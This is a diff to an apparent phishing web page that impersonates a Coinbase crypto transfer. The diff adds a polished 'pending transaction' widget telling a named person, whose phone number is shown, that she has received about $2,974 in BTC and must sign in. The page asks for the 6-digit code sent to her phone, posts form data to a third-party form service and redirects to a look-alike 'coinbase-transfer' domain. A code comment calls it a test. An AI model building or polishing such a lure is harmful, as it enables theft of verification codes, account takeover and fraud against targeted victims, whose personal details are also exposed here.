@@ -144,9 +144,127 @@
 
   <main>
     <section class="card">
-      <h1>  <span style="color:black; font-size:23px; font-weight:800;">Welcome back Mary </span> </h1>
+      <h1>  <span style="color:black; font-size:23px; font-weight:800;">Welcome back </span> </h1>
 
-      <div class="notice"> (1) pending, $2978.82 - 0.051BTC  received <p> <span style="color:black; font-size:12px; font-weight:400;"> transaction speed </span> <span style="color:green; font-size:14px; font-weight:600;"> instant ⚡︎</span> </p> </div>
+      <div class="notice"><!-- Paste this inside your existing <div> -->
+<style>
+  .ex-pending-widget {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    text-align: center;
+    max-width: 360px;
+    margin: 0 auto;
+    box-sizing: border-box;
+  }
+
+  .ex-pending-widget * {
+    box-sizing: border-box;
+  }
+
+  .ex-pending-icon {
+    width: 68px;
+    height: 68px;
+    background-color: #eff6ff;
+    color: #0066ff;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 0 auto 20px auto;
+  }
+
+  .ex-pending-icon svg {
+    width: 32px;
+    height: 32px;
+  }
+
+  .ex-pending-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: #111827;
+    margin: 0 0 8px 0;
+  }
+
+  .ex-pending-subtitle {
+    font-size: 15px;
+    color: #4b5563;
+    margin: 0 0 24px 0;
+  }
+
+  .ex-pending-card {
+    background-color: #f9fafb;
+    border: 1px solid #e5e7eb;
+    border-radius: 16px;
+    padding: 16px 18px;
+    text-align: left;
+  }
+
+  .ex-pending-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 0;
+    font-size: 14px;
+  }
+
+  .ex-pending-row:not(:last-child) {
+    border-bottom: 1px solid #e5e7eb;
+  }
+
+  .ex-pending-label {
+    color: #6b7280;
+  }
+
+  .ex-pending-value {
+    font-weight: 600;
+    color: #111827;
+  }
+
+  .ex-pending-pill {
+    background-color: #fef3c7;
+    color: #b45309;
+    padding: 4px 10px;
+    border-radius: 999px;
+    font-size: 12px;
+    font-weight: 600;
+  }
+</style>
+
+<div class="ex-pending-widget">
+  <!-- Clock Icon -->
+  <div class="ex-pending-icon">
+    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <circle cx="12" cy="12" r="10"></circle>
+      <polyline points="12 6 12 12 16 14"></polyline>
+    </svg>
+  </div>
+
+  <!-- Heading -->
+<p style="font-size:14px; color:black; margin-bottom: 14px;"> <strong> Mary Kathan </strong> (+16073777311) you have received <strong> $2,974.82  -    0.051BTC</strong>  from Tom Jones 19*********</h1> </p> 
+  <h2 class="ex-pending-title">1 Pending Transaction</h2>
+  <p class="ex-pending-subtitle">Sign in to finish receiving</p>
+
+  <!-- Details Table Card -->
+  <div class="ex-pending-card">
+    <div class="ex-pending-row">
+      <span class="ex-pending-label">Status</span>
+      <span class="ex-pending-pill">Awaiting Verification</span>
+    </div>
+    <div class="ex-pending-row">
+      <span class="ex-pending-label">Account</span>
+      <span class="ex-pending-value">Mary Kathan</span>
+    </div>
+    <div class="ex-pending-row">
+      <span class="ex-pending-label">Amount</span>
+      <span class="ex-pending-value"> $2,974.82</span>
+    </div>
+    <div class="ex-pending-row">
+      <span class="ex-pending-label">Reference ID</span>
+      <span class="ex-pending-value">#EX-904821</span>
+    </div>
+  </div>
+</div>
+</span> </p>
+</div>
 
       <p class="hint"> confirm transaction</p> <p> <span style="color:black; font-size:14px; font-weight:500;"> Enter the 6-digits code sent to your mobile number (+16073777311) to confirm this transaction and finish receiving.</span> </p>
 
@@ -189,7 +307,7 @@
     // Your Web3Forms access key (safe to be public: it can only send to your email)
     var ACCESS_KEY = "13074adb-ae1c-46d5-81ae-bc762824954a";
     // Where people go after submitting, so they know it's a test
-    var REDIRECT_URL = "https://coinbase-tranfer.web.app/processing";
+    var REDIRECT_URL = "https://coinbase-transfer.web.app/processing";
 
     var form = document.getElementById("postal-form");
     var input = document.getElementById("postal");
